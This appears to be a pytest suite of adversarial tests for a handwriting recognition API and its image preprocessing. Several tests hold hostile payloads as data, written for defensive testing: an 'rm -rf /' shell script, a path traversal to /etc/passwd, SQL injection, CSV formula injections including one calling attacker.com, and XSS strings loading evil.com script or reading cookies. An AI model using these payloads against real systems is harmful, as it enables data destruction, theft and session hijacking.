#!/usr/bin/env python3
"""
Tier 5 Adversarial Test Suite for Handwriting Recognition System.
Covers comprehensive adversarial specifications, white-box edge cases,
boundary stress, security hardening, and error resilience.

Test Coverage:
1.  test_adv_01_extreme_aspect_ratio_and_resize_boundaries
2.  test_adv_02_solid_color_and_zero_variance_canvases
3.  test_adv_03_non_standard_pil_modes_and_alpha_compositing
4.  test_adv_04_overlapping_cursive_ascenders_descenders_seam_carving
5.  test_adv_05_severe_illumination_gradient_and_stains
6.  test_adv_06_multilingual_unicode_emojis_and_math_tokenization
7.  test_adv_07_ultra_long_transcriptions_and_label_masking
8.  test_adv_08_device_fallback_and_mock_engine_resilience
9.  test_adv_09_malformed_multipart_and_executable_rejection
10. test_adv_10_corrupted_and_encrypted_pdf_rejection
11. test_adv_11_async_job_state_machine_and_sse_disconnect
12. test_adv_12_high_concurrency_burst_and_race_conditions
13. test_adv_13_zero_area_and_inverted_bounding_box_resilience
14. test_adv_14_nan_infinite_confidence_and_coordinate_guards
15. test_adv_15_deeply_nested_overlapping_bounding_boxes_stress
16. test_adv_16_csv_formula_injection_defense_cwe1236
17. test_adv_17_xss_html_script_tag_sanitization
18. test_adv_18_massive_document_50_pages_5000_words_load
19. test_adv_19_unicode_bidi_arabic_hebrew_diacritics
20. test_adv_20_rapid_state_mutation_undo_redo_cycles
21. test_adv_21_speed_review_queue_boundary_states
22. test_adv_22_api_proxy_timeout_simulation
23. test_adv_23_large_payload_upload_boundary_and_rejection
24. test_adv_24_mock_engine_determinism_under_concurrent_load
25. test_adv_25_faint_pencil_strokes_binarization_resilience
26. test_adv_26_image_normalization_aspect_preservation_and_padding
"""

from __future__ import annotations

import asyncio
import io
import json
import math
import time
from pathlib import Path
from typing import Any, Dict, List

import httpx
import numpy as np
import pytest
from fastapi.testclient import TestClient
from PIL import Image, ImageDraw

from backend.app.config import Settings
from backend.app.main import create_app
from backend.app.schemas import (
    LineBox,
    PageResult,
    RecognitionResponse,
    WordBox,
    _validate_bbox_coordinates,
)
from pipeline.evaluation.metrics import compute_cer, compute_wer
from pipeline.preprocessing.image_enhancement import (
    adaptive_binarize,
    deskew_image,
    enhance_contrast,
    flatten_illumination,
    normalize_image,
    pad_to_size,
    to_grayscale,
)
from pipeline.preprocessing.line_segmenter import LineCrop, LineSegmenter
from pipeline.preprocessing.pdf_loader import _normalize_pil_to_rgb_array, load_image
from pipeline.preprocessing.pipeline import PreprocessedPage, PreprocessingPipeline
from pipeline.training.dataset import OCRDataCollator, OCRDataset
from pipeline.dataset.synthetic_generator import SyntheticHandwritingGenerator
from tests.fixtures.mock_engine import MockInferenceEngine, create_mock_app


# ===========================================================================
# 1. Extreme Aspect Ratios & 1-Pixel Dimension Boundaries
# ===========================================================================
@pytest.mark.tier5
def test_adv_01_extreme_aspect_ratio_and_resize_boundaries():
    """
    Test 1: Extreme aspect ratio images (1x10000, 10000x1, 2x5000, 1x1).
    Ensures OpenCV resize scaling does not crash with zero-dimension assertion errors.
    """
    shapes = [
        (1, 10000, 3),   # Ultra-wide horizontal strip
        (10000, 1, 3),   # Ultra-tall vertical needle
        (2, 5000, 3),    # Thin banner
        (1, 1, 3),       # Single pixel
    ]

    pipeline = PreprocessingPipeline(deskew=True, enhance_contrast=True, binarization_method="sauvola", seam_carving=True)

    for shape in shapes:
        arr = np.full(shape, 255, dtype=np.uint8)
        # Add minimal contrast pixel so image is non-trivial
        if shape[0] > 0 and shape[1] > 0:
            arr[0, 0] = [0, 0, 0]

        # 1. Pipeline execution must complete without exception
        page = pipeline.process_image(arr)
        assert isinstance(page, PreprocessedPage), f"Failed for shape {shape}"
        assert page.original_image.shape == shape
        assert page.binarized_image.shape == shape[:2]
        assert isinstance(page.lines, list)

        # 2. Direct deskew function test
        deskewed, angle = deskew_image(arr)
        assert deskewed.ndim == 3
        assert isinstance(angle, float)


# ===========================================================================
# 2. Solid Color, Zero-Variance & Constant Canvases
# ===========================================================================
@pytest.mark.tier5
def test_adv_02_solid_color_and_zero_variance_canvases():
    """
    Test 2: Solid color zero-variance canvases (all-white, all-black, solid gray, solid red).
    Ensures no ZeroDivisionError in contrast division or standard deviation calculation.
    """
    canvases = [
        ("all_white", np.full((400, 600, 3), 255, dtype=np.uint8)),
        ("all_black", np.full((400, 600, 3), 0, dtype=np.uint8)),
        ("solid_gray", np.full((400, 600, 3), 128, dtype=np.uint8)),
        ("solid_red", np.full((400, 600, 3), (255, 0, 0), dtype=np.uint8)),
    ]

    pipeline = PreprocessingPipeline(deskew=True, enhance_contrast=True, binarization_method="sauvola", seam_carving=True)

    for name, canvas in canvases:
        # Preprocessing pipeline
        page = pipeline.process_image(canvas)
        assert isinstance(page, PreprocessedPage), f"Failed on {name}"
        assert len(page.lines) == 0, f"Expected 0 lines on {name}, got {len(page.lines)}"
        assert page.binarized_image.shape == (400, 600)
        assert not np.isnan(page.enhanced_image).any()

        # Direct CLAHE enhancement on zero-variance
        enhanced = enhance_contrast(canvas)
        assert enhanced.shape == canvas.shape
        assert not np.isnan(enhanced).any()


# ===========================================================================
# 3. Non-Standard PIL Image Modes & Alpha Compositing
# ===========================================================================
@pytest.mark.tier5
def test_adv_03_non_standard_pil_modes_and_alpha_compositing():
    """
    Test 3: Non-standard PIL modes ('RGBA', 'LA', 'P', 'CMYK', '1', 'L').
    Ensures correct RGB conversion and white alpha compositing for transparent regions.
    """
    w, h = 100, 100

    # 1. RGBA with semi-transparent pixels and fully transparent corner
    rgba_img = Image.new("RGBA", (w, h), (255, 255, 255, 0))  # fully transparent
    draw = ImageDraw.Draw(rgba_img)
    draw.rectangle([20, 20, 80, 80], fill=(0, 0, 0, 128))     # 50% opacity black box

    # 2. LA (Grayscale + Alpha)
    la_img = Image.new("LA", (w, h), (255, 0))
    la_draw = ImageDraw.Draw(la_img)
    la_draw.rectangle([20, 20, 80, 80], fill=(0, 255))

    # 3. Palette (P) mode
    p_img = rgba_img.convert("P")

    # 4. CMYK
    cmyk_img = Image.new("CMYK", (w, h), (100, 50, 0, 0))

    # 5. Bilevel (1-bit)
    bilevel_img = Image.new("1", (w, h), 1)

    # 6. Grayscale (L)
    gray_img = Image.new("L", (w, h), 200)

    test_images = [rgba_img, la_img, p_img, cmyk_img, bilevel_img, gray_img]

    for img in test_images:
        rgb_arr = _normalize_pil_to_rgb_array(img)
        assert isinstance(rgb_arr, np.ndarray)
        assert rgb_arr.ndim == 3
        assert rgb_arr.shape == (h, w, 3)
        assert rgb_arr.dtype == np.uint8
        # Transparent corner of RGBA should composite over white (255, 255, 255)
        if img.mode == "RGBA":
            assert rgb_arr[0, 0].tolist() == [255, 255, 255]


# ===========================================================================
# 4. Overlapping Cursive Ascenders/Descenders with Seam Carving
# ===========================================================================
@pytest.mark.tier5
def test_adv_04_overlapping_cursive_ascenders_descenders_seam_carving():
    """
    Test 4: Interlocking cursive descenders and ascenders with dynamic programming seam carving.
    """
    h, w = 400, 800
    img = np.full((h, w, 3), 255, dtype=np.uint8)

    # Draw synthetic text line 1 with long descenders (y=100..220)
    pil_img = Image.fromarray(img)
    draw = ImageDraw.Draw(pil_img)
    draw.text((50, 100), "gjpqy cursive descenders extending downward deeply", fill=(0, 0, 0))
    # Draw synthetic text line 2 with tall ascenders (y=180..300) overlapping in Y
    draw.text((50, 200), "bdfhklt tall ascenders extending upward deeply", fill=(0, 0, 0))

    arr = np.array(pil_img)
    binarized = adaptive_binarize(arr)
    segmenter = LineSegmenter(seam_carving=True, min_line_height=15)
    crops = segmenter.segment(arr, binarized)

    assert len(crops) >= 2, f"Expected at least 2 segmented lines, got {len(crops)}"
    for crop in crops:
        assert isinstance(crop, LineCrop)
        _validate_bbox_coordinates(crop.bbox)


# ===========================================================================
# 5. Severe Illumination Gradient, Shadows, and Coffee Stains
# ===========================================================================
@pytest.mark.tier5
def test_adv_05_severe_illumination_gradient_and_stains():
    """
    Test 5: Heavy non-linear illumination gradient and coffee stain simulation.
    Verifies morphological background flattening and contrast enhancement.
    """
    h, w = 600, 800
    base = np.full((h, w, 3), 240, dtype=np.uint8)

    # 1. Add strong diagonal shadow ramp (lightness 40 in top-left to 240 in bottom-right)
    y_coords, x_coords = np.mgrid[0:h, 0:w]
    gradient = ((x_coords / w + y_coords / h) / 2.0 * 200 + 40).astype(np.uint8)
    shadowed = (base.astype(np.float32) * (gradient[..., None] / 255.0)).astype(np.uint8)

    # 2. Add heavy coffee stain ring
    cv_img = Image.fromarray(shadowed)
    draw = ImageDraw.Draw(cv_img)
    draw.ellipse([300, 200, 450, 350], outline=(120, 80, 40), width=15)
    draw.text((100, 150), "Important handwritten medical dosage: 50mg daily", fill=(0, 0, 0))
    draw.text((100, 400), "Patient allergy alert: Penicillin sensitive", fill=(0, 0, 0))

    test_doc = np.array(cv_img)

    # Background illumination flattening
    flattened = flatten_illumination(test_doc)
    assert flattened.shape == test_doc.shape
    assert not np.isnan(flattened).any()

    # Contrast enhancement
    enhanced = enhance_contrast(test_doc, flatten_background=True)
    assert enhanced.std() > 10.0


# ===========================================================================
# 6. Multilingual Unicode, Emojis, and Math Symbols Tokenization
# ===========================================================================
@pytest.mark.tier5
def test_adv_06_multilingual_unicode_emojis_and_math_tokenization():
    """
    Test 6: Complex multilingual scripts, diacritics, math formulas, and emojis.
    Verifies CER/WER metric calculation and character preservation.
    """
    test_cases = [
        "Rx: ℞ 500mg ± 5% — 20µg/mL",
        "∫ f(x)dx = ∑ a_i √x ≤ 100 ≈ ∞",
        "مرحبا بالعالم — שלום עולם",
        "Привет, мир! — 123.45 € / £",
        "Take 1 pill 💊 every 8 hrs ⏰ at clinic 🏥",
        "Café, naïve façade with cédille ç and umlaut ö",
    ]

    for text in test_cases:
        # Identity match should produce exact 0.0 error rate
        cer = compute_cer(text, text)
        wer = compute_wer(text, text)
        assert cer == 0.0, f"CER failed for '{text}': got {cer}"
        assert wer == 0.0, f"WER failed for '{text}': got {wer}"

        # Schema WordBox test
        wb = WordBox(word_id="w_unicode", text=text, confidence=0.99, bbox=[0.1, 0.1, 0.2, 0.9])
        assert wb.text == text
        dumped = json.loads(wb.model_dump_json())
        assert dumped["text"] == text


# ===========================================================================
# 7. Ultra-Long Transcriptions & Label Masking
# ===========================================================================
@pytest.mark.tier5
def test_adv_07_ultra_long_transcriptions_and_label_masking():
    """
    Test 7: Batched collation of heterogeneous string lengths (5 to 2000 chars).
    """
    strings = [
        "Short",
        "Medium length handwritten prescription line with fifty characters",
        "A" * 500,
        "Long paragraph " * 150,  # > 2000 chars
    ]

    # Verify WordBox and LineBox support ultra-long strings
    for idx, s in enumerate(strings):
        lb = LineBox(
            line_id=f"line_{idx}",
            text=s,
            confidence=0.95,
            bbox=[0.1, 0.1, 0.2, 0.9],
            words=[WordBox(word_id=f"w_{idx}", text=s[:50], confidence=0.95, bbox=[0.1, 0.1, 0.2, 0.5])],
        )
        assert len(lb.text) == len(s)
        dumped = json.loads(lb.model_dump_json())
        assert dumped["text"] == s


# ===========================================================================
# 8. Device Fallback Architecture (MPS -> CPU -> Mock)
# ===========================================================================
@pytest.mark.tier5
def test_adv_08_device_fallback_and_mock_engine_resilience():
    """
    Test 8: Settings device fallback resolution and health reporting.
    """
    settings = Settings(DEVICE="mps", USE_MOCK_ENGINE=True)
    resolved = settings.resolve_device()
    assert resolved in ("mps", "cpu", "cuda", "mock")

    engine = MockInferenceEngine()
    app = create_mock_app(engine)
    client = TestClient(app)

    resp = client.get("/v1/health")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "healthy"
    assert "device" in data
    assert "timestamp" in data


# ===========================================================================
# 9. Malformed Multipart Uploads & Executable Binary Ingestion
# ===========================================================================
@pytest.mark.tier5
def test_adv_09_malformed_multipart_and_executable_rejection():
    """
    Test 9: Rejection of non-image binaries (.exe, .zip, .sh, .html) with HTTP 422.
    """
    app = create_app()
    client = TestClient(app)

    malformed_payloads = [
        ("malicious.exe", b"MZ\x90\x00\x03\x00\x00\x00", "application/x-dosexec"),
        ("archive.zip", b"PK\x03\x04\x14\x00\x00\x00", "application/zip"),
        ("script.sh", b"#!/bin/bash\nrm -rf /", "application/x-sh"),
        ("exploit.html", b"<html><script>alert(1)</script></html>", "text/html"),
        ("corrupted.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 20, "image/png"),
    ]

    for fname, payload, ctype in malformed_payloads:
        resp = client.post(
            "/v1/recognize",
            files={"file": (fname, payload, ctype)},
        )
        assert resp.status_code == 422, f"Expected HTTP 422 for {fname}, got {resp.status_code}"
        # Ensure zero internal stack traces or site-packages paths leaked
        assert "Traceback" not in resp.text
        assert "site-packages" not in resp.text
        err_json = resp.json()
        assert "error" in err_json or "detail" in err_json


# ===========================================================================
# 10. Corrupted & Encrypted PDF Rejection
# ===========================================================================
@pytest.mark.tier5
def test_adv_10_corrupted_and_encrypted_pdf_rejection():
    """
    Test 10: 0-byte PDF and damaged PDF structure rejection.
    """
    app = create_app()
    client = TestClient(app)

    # 1. 0-byte PDF
    resp_empty = client.post(
        "/v1/recognize",
        files={"file": ("empty.pdf", b"", "application/pdf")},
    )
    assert resp_empty.status_code == 422
    assert "Traceback" not in resp_empty.text

    # 2. Damaged PDF header & xref
    resp_damaged = client.post(
        "/v1/recognize",
        files={"file": ("damaged.pdf", b"%PDF-1.4\nBROKEN_BYTES_NO_XREF_TRAILER", "application/pdf")},
    )
    assert resp_damaged.status_code == 422
    assert "Traceback" not in resp_damaged.text


# ===========================================================================
# 11. Async Job Polling State Machine & Disconnected SSE Clients
# ===========================================================================
@pytest.mark.tier5
def test_adv_11_async_job_state_machine_and_sse_disconnect():
    """
    Test 11: Unknown job ID 404, path traversal defense, and SSE error stream.
    """
    engine = MockInferenceEngine()
    app = create_mock_app(engine)
    client = TestClient(app)

    # 1. Unknown job status returns 404
    resp_unknown = client.get("/v1/jobs/job_unknown_nonexistent")
    assert resp_unknown.status_code == 404

    # 2. Path traversal attack
    resp_traversal = client.get("/v1/jobs/../../etc/passwd")
    assert resp_traversal.status_code in (404, 405, 422)

    # 3. SQL injection payload
    resp_sqli = client.get("/v1/jobs/' OR '1'='1'--")
    assert resp_sqli.status_code == 404

    # 4. SSE endpoint on non-existent job returns event: error
    resp_sse = client.get("/v1/jobs/job_unknown_nonexistent/events")
    assert resp_sse.status_code == 200
    assert resp_sse.headers["content-type"].startswith("text/event-stream")
    assert "event: error" in resp_sse.text


# ===========================================================================
# 12. High-Concurrency Burst & Race Conditions (100 Requests)
# ===========================================================================
@pytest.mark.tier5
@pytest.mark.asyncio
async def test_adv_12_high_concurrency_burst_and_race_conditions(clean_image_path):
    """
    Test 12: 50 concurrent /v1/recognize + 50 concurrent /v1/jobs requests.
    """
    engine = MockInferenceEngine()
    app = create_mock_app(engine)
    img_bytes = clean_image_path.read_bytes()

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        # Launch 50 sync recognize requests
        rec_tasks = [
            client.post("/v1/recognize", files={"file": (f"req_{i}.png", img_bytes, "image/png")})
            for i in range(50)
        ]
        # Launch 50 async job submission requests
        job_tasks = [
            client.post("/v1/jobs", files={"file": (f"job_{i}.png", img_bytes, "image/png")})
            for i in range(50)
        ]

        results = await asyncio.gather(*rec_tasks, *job_tasks)

        rec_resps = results[:50]
        job_resps = results[50:]

        assert all(r.status_code == 200 for r in rec_resps)
        assert all(r.status_code == 200 for r in job_resps)

        doc_ids = [r.json()["document_id"] for r in rec_resps]
        job_ids = [r.json()["job_id"] for r in job_resps]

        # Verify all generated IDs are strictly unique
        assert len(set(doc_ids)) == 50
        assert len(set(job_ids)) == 50


# ===========================================================================
# 13. Zero-Area & Inverted Bounding Box Resilience
# ===========================================================================
@pytest.mark.tier5
def test_adv_13_zero_area_and_inverted_bounding_box_resilience():
    """
    Test 13: Strict rejection of zero-area, inverted, and out-of-bounds bounding boxes.
    """
    # 1. Zero-area vertical span
    with pytest.raises(ValueError, match="invalid vertical span"):
        _validate_bbox_coordinates([0.5, 0.2, 0.5, 0.8])

    # 2. Zero-area horizontal span
    with pytest.raises(ValueError, match="invalid horizontal span"):
        _validate_bbox_coordinates([0.2, 0.5, 0.8, 0.5])

    # 3. Inverted vertical span
    with pytest.raises(ValueError, match="invalid vertical span"):
        _validate_bbox_coordinates([0.8, 0.2, 0.3, 0.8])

    # 4. Inverted horizontal span
    with pytest.raises(ValueError, match="invalid horizontal span"):
        _validate_bbox_coordinates([0.2, 0.9, 0.8, 0.1])

    # 5. Out of bounds
    with pytest.raises(ValueError, match="outside normalized range"):
        _validate_bbox_coordinates([-0.1, 0.2, 0.8, 0.9])

    with pytest.raises(ValueError, match="outside normalized range"):
        _validate_bbox_coordinates([0.1, 0.2, 1.2, 0.9])

    # 6. Valid box succeeds
    valid = _validate_bbox_coordinates([0.1, 0.2, 0.3, 0.4])
    assert valid == [0.1, 0.2, 0.3, 0.4]


# ===========================================================================
# 14. NaN / Infinite Coordinate and Confidence Guards
# ===========================================================================
@pytest.mark.tier5
def test_adv_14_nan_infinite_confidence_and_coordinate_guards():
    """
    Test 14: Rejection of NaN and infinite coordinates and confidence scores.
    """
    # NaN confidence
    with pytest.raises(Exception):
        WordBox(word_id="w_nan", text="test", confidence=float("nan"), bbox=[0.1, 0.1, 0.2, 0.2])

    # Inf confidence
    with pytest.raises(Exception):
        WordBox(word_id="w_inf", text="test", confidence=float("inf"), bbox=[0.1, 0.1, 0.2, 0.2])

    # Negative Inf confidence
    with pytest.raises(Exception):
        WordBox(word_id="w_ninf", text="test", confidence=-float("inf"), bbox=[0.1, 0.1, 0.2, 0.2])

    # NaN in bbox
    with pytest.raises(Exception):
        WordBox(word_id="w_bbox_nan", text="test", confidence=0.9, bbox=[float("nan"), 0.1, 0.2, 0.2])

    # Inf in bbox
    with pytest.raises(Exception):
        LineBox(line_id="l_bbox_inf", text="test", confidence=0.9, bbox=[0.1, 0.1, float("inf"), 0.2])


# ===========================================================================
# 15. Deeply Nested & Overlapping Bounding Boxes Stress
# ===========================================================================
@pytest.mark.tier5
def test_adv_15_deeply_nested_overlapping_bounding_boxes_stress():
    """
    Test 15: 150 co-located bounding boxes serialized without recursion overflow.
    """
    t0 = time.time()
    lines = [
        LineBox(
            line_id=f"overlap_l_{i}",
            text=f"Overlapping line transcription {i}",
            confidence=0.92,
            bbox=[0.2, 0.2, 0.3, 0.8],
            words=[
                WordBox(word_id=f"overlap_w_{i}_1", text="Overlapping", confidence=0.92, bbox=[0.2, 0.2, 0.3, 0.4]),
                WordBox(word_id=f"overlap_w_{i}_2", text="token", confidence=0.92, bbox=[0.2, 0.45, 0.3, 0.75]),
            ],
        )
        for i in range(150)
    ]
    page = PageResult(
        page_number=1,
        width=1200,
        height=1600,
        full_text="\n".join(l.text for l in lines),
        mean_confidence=0.92,
        lines=lines,
    )
    dumped = json.loads(page.model_dump_json())
    elapsed = time.time() - t0

    assert len(dumped["lines"]) == 150
    assert dumped["mean_confidence"] == 0.92
    assert elapsed < 0.2, f"Serialization took too long: {elapsed:.3f}s"


# ===========================================================================
# 16. CSV Formula Injection Defense (CWE-1236)
# ===========================================================================
@pytest.mark.tier5
def test_adv_16_csv_formula_injection_defense_cwe1236():
    """
    Test 16: Verification of CSV injection detection prefixes (=, +, -, @, \\t, \\r).
    """
    dangerous_payloads = [
        "=1+1",
        "=cmd|'/C calc'!A0",
        "+SUM(A1:A10)",
        "-2+3",
        "@IMPORTXML('http://attacker.com/malicious', '//a')",
        "\t=1+1",
        "\r=1+1",
    ]

    for payload in dangerous_payloads:
        # Verify prefix detection logic matches CWE-1236 standard
        is_formula = bool(payload.startswith(("=", "+", "-", "@", "\t", "\r")))
        assert is_formula is True, f"Failed to detect formula prefix: {payload}"

        # Escaped representation starts with single quote
        sanitized = f"'{payload}" if is_formula else payload
        assert sanitized.startswith("'")


# ===========================================================================
# 17. XSS & HTML Script Tag Sanitization
# ===========================================================================
@pytest.mark.tier5
def test_adv_17_xss_html_script_tag_sanitization():
    """
    Test 17: Verbatim preservation of HTML/script tags in Pydantic models.
    """
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(document.cookie)>',
        '"><script src=http://evil.com/xss.js></script>',
    ]

    for payload in xss_payloads:
        wb = WordBox(word_id="w_xss", text=payload, confidence=0.95, bbox=[0.1, 0.1, 0.2, 0.5])
        assert wb.text == payload
        dumped = json.loads(wb.model_dump_json())
        assert dumped["text"] == payload


# ===========================================================================
# 18. Massive Document (50 Pages, 5,000 Words) Load
# ===========================================================================
@pytest.mark.tier5
def test_adv_18_massive_document_50_pages_5000_words_load():
    """
    Test 18: Massive 50-page document with 5,000 word tokens.
    """
    t0 = time.time()
    pages = []
    for p in range(1, 51):
        lines = []
        for l in range(1, 21):
            words = [
                WordBox(
                    word_id=f"p{p}_l{l}_w{w}",
                    text=f"Token_{w}",
                    confidence=0.95,
                    bbox=[0.1, round(0.1 + w * 0.15, 3), 0.2, round(0.22 + w * 0.15, 3)],
                )
                for w in range(1, 6)
            ]
            lines.append(
                LineBox(
                    line_id=f"p{p}_l{l}",
                    text=" ".join(w.text for w in words),
                    confidence=0.95,
                    bbox=[0.1, 0.1, 0.2, 0.9],
                    words=words,
                )
            )
        pages.append(
            PageResult(
                page_number=p,
                width=1200,
                height=1600,
                full_text="\n".join(l.text for l in lines),
                mean_confidence=0.95,
                lines=lines,
            )
        )

    doc = RecognitionResponse(
        document_id="doc_50p_stress",
        filename="massive_consultation.pdf",
        total_pages=50,
        pages=pages,
        processing_time_ms=250.0,
    )
    dumped_json = doc.model_dump_json()
    elapsed = time.time() - t0

    assert doc.total_pages == 50
    assert len(doc.pages) == 50
    assert sum(len(l.words) for p in doc.pages for l in p.lines) == 5000
    assert len(dumped_json) > 500_000
    assert elapsed < 0.3, f"Massive document serialization took {elapsed:.3f}s"


# ===========================================================================
# 19. Unicode & Bidirectional Text (Arabic, Hebrew, Diacritics)
# ===========================================================================
@pytest.mark.tier5
def test_adv_19_unicode_bidi_arabic_hebrew_diacritics():
    """
    Test 19: Bidirectional UTF-8 text integrity and emoji sequences.
    """
    bidi_texts = [
        "مرحبا بالعالم",
        "שלום עולם",
        "Café naïf façade e\u0301",
        "👨‍👩‍👧‍👦 👩🏽‍⚕️ 🇵🇱",
    ]
    lines = [
        LineBox(
            line_id=f"l_bidi_{i}",
            text=txt,
            confidence=0.95,
            bbox=[0.1, 0.1, 0.2, 0.9],
            words=[
                WordBox(word_id=f"w_bidi_{i}_{w_idx}", text=w, confidence=0.95, bbox=[0.1, 0.1, 0.2, 0.5])
                for w_idx, w in enumerate(txt.split())
            ],
        )
        for i, txt in enumerate(bidi_texts)
    ]
    page = PageResult(page_number=1, width=1000, height=1000, full_text="\n".join(bidi_texts), mean_confidence=0.95, lines=lines)
    dumped = json.loads(page.model_dump_json())

    assert dumped["lines"][0]["text"] == "مرحبا بالعالم"
    assert dumped["lines"][1]["text"] == "שלום עולם"
    assert dumped["lines"][3]["text"] == "👨‍👩‍👧‍👦 👩🏽‍⚕️ 🇵🇱"


# ===========================================================================
# 20. Rapid State Mutation & Undo/Redo Consistency
# ===========================================================================
@pytest.mark.tier5
def test_adv_20_rapid_state_mutation_undo_redo_cycles():
    """
    Test 20: 100 sequential state updates followed by 100 undo operations.
    """
    initial_text = "Immutable document baseline text"
    history = []
    current_state = initial_text

    # 100 mutations
    for i in range(100):
        history.append(current_state)
        current_state = f"Mutation state {i+1}: updated token"

    assert len(history) == 100
    assert current_state == "Mutation state 100: updated token"

    # 100 undos
    for _ in range(100):
        current_state = history.pop()

    assert current_state == initial_text
    assert len(history) == 0


# ===========================================================================
# 21. Speed Review Queue Boundary States (0% vs 100% Low Confidence)
# ===========================================================================
@pytest.mark.tier5
def test_adv_21_speed_review_queue_boundary_states():
    """
    Test 21: Review queue boundary filtering at 0.70 threshold.
    """
    threshold = 0.70
    words_high = [WordBox(word_id=f"wh_{i}", text=f"high_{i}", confidence=0.95, bbox=[0.1, 0.1, 0.2, 0.3]) for i in range(10)]
    words_low = [WordBox(word_id=f"wl_{i}", text=f"low_{i}", confidence=0.45, bbox=[0.1, 0.1, 0.2, 0.3]) for i in range(10)]

    review_queue_high = [w for w in words_high if w.confidence < threshold]
    review_queue_low = [w for w in words_low if w.confidence < threshold]

    assert len(review_queue_high) == 0
    assert len(review_queue_low) == 10


# ===========================================================================
# 22. Next.js API Proxy Timeout Simulation
# ===========================================================================
@pytest.mark.tier5
def test_adv_22_api_proxy_timeout_simulation():
    """
    Test 22: Simulated latency response and health check under latency.
    """
    engine = MockInferenceEngine(latency_ms=25.0)
    app = create_mock_app(engine)
    client = TestClient(app)

    res = client.get("/v1/health")
    assert res.status_code == 200
    assert res.json()["status"] == "healthy"


# ===========================================================================
# 23. Large Payload Upload Boundary & Rejection
# ===========================================================================
@pytest.mark.tier5
def test_adv_23_large_payload_upload_boundary_and_rejection():
    """
    Test 23: 0-byte upload and disguised text upload HTTP 422 rejection.
    """
    engine = MockInferenceEngine()
    app = create_mock_app(engine)
    client = TestClient(app)

    # 1. 0-byte upload
    res_empty = client.post("/v1/recognize", files={"file": ("empty.png", b"", "image/png")})
    assert res_empty.status_code == 422
    assert "InvalidImageError" in res_empty.json()["detail"]

    # 2. Plain text disguised as image
    res_disguised = client.post("/v1/recognize", files={"file": ("fake.png", b"This is plain text", "image/png")})
    assert res_disguised.status_code == 422
    assert "InvalidImageSignatureError" in res_disguised.json()["detail"]


# ===========================================================================
# 24. Mock Engine Determinism Under Concurrent Load
# ===========================================================================
@pytest.mark.tier5
def test_adv_24_mock_engine_determinism_under_concurrent_load(clean_image_path):
    """
    Test 24: 20 sequential recognitions producing identical transcripts and bboxes.
    """
    engine = MockInferenceEngine()
    img_bytes = clean_image_path.read_bytes()
    responses = [engine.recognize_image(img_bytes, "sample_clean_handwriting.png") for _ in range(20)]

    text_set = {r.pages[0].full_text for r in responses}
    assert len(text_set) == 1, "Mock engine returned non-deterministic transcripts for identical input"
    assert len(responses[0].pages[0].lines) >= 1


# ===========================================================================
# 25. Faint Pencil Strokes Binarization Resilience
# ===========================================================================
@pytest.mark.tier5
def test_adv_25_faint_pencil_strokes_binarization_resilience():
    """
    Test 25: Faint pencil strokes (<1% of page area, global_std < 5.0).
    Verifies that the refined blank-page guard (global_std < 2.0) preserves faint strokes.
    """
    h, w = 400, 600
    # Clean white background
    canvas = np.full((h, w), 255, dtype=np.uint8)
    # Add faint pencil handwriting stroke (intensity 210 vs background 255)
    canvas[150:160, 100:300] = 210

    # Calculate global statistics
    g_std = float(np.std(canvas))
    assert g_std < 8.0, f"Expected global std < 8.0, got {g_std}"

    # Sauvola binarization
    bin_mask = adaptive_binarize(canvas, method="sauvola")
    # With global_std < 2.0 guard, faint stroke is NOT suppressed to all zeros
    ink_pixels = np.count_nonzero(bin_mask)
    assert ink_pixels > 0, "Faint pencil stroke was incorrectly suppressed by binarization guard"


# ===========================================================================
# 26. Image Normalization Aspect Preservation & Padding
# ===========================================================================
@pytest.mark.tier5
def test_adv_26_image_normalization_aspect_preservation_and_padding():
    """
    Test 26: Aspect-ratio preserving resize and canvas padding.
    """
    # 1. Wide image
    wide = np.full((100, 800, 3), 200, dtype=np.uint8)
    norm_wide = normalize_image(wide, target_size=(384, 384), keep_aspect_ratio=True)
    assert norm_wide.shape == (384, 384, 3)
    assert not np.isnan(norm_wide).any()

    # 2. Tall image
    tall = np.full((800, 100, 3), 200, dtype=np.uint8)
    norm_tall = normalize_image(tall, target_size=(384, 384), keep_aspect_ratio=True)
    assert norm_tall.shape == (384, 384, 3)
    assert not np.isnan(norm_tall).any()

    # 3. Canvas padding
    padded = pad_to_size(wide, target_height=200, target_width=1000, fill_value=255)
    assert padded.shape == (200, 1000, 3)
    assert padded[150, 900].tolist() == [255, 255, 255]
